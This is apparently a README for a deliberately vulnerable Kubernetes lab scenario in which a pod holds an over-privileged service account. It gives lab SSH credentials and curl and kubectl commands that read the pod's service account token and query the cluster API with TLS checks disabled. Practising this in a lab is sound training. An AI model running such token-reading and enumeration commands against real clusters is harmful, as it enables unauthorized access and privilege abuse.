# Overpowered Service Account

This scenario simulates a pod using a service account with too much privileges over the cluster. You can connect to this pod using SSH:
```bash
ssh pwned@10.10.20.2 -p 30022 # Password: pwned
```

You can continue reading for a guided exploitation or research for yourself and try to own all the nodes without guidance!

## How to exploit this?

Start exploring your level of access (In this scenario is nearly unlimited), an example of how to get all the deployments from the K8S api is provided here:

```bash
curl -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" -k https://10.10.20.2:6443/api/apps/v1/deployments
```

Also, you could just get the `kubectl` binary to ease your enumeration/exploitation:

```bash
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl
```

Using `kubectl` to get the deployments is as easy as:

```bash
./kubectl --token $(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --server https://10.10.20.2:6443 --insecure-skip-tls-verify=true get deployments -A
```


## References

- https://kubernetes.io/docs/concepts/overview/kubernetes-api/
- https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-enumeration#enumeration-cheatsheet
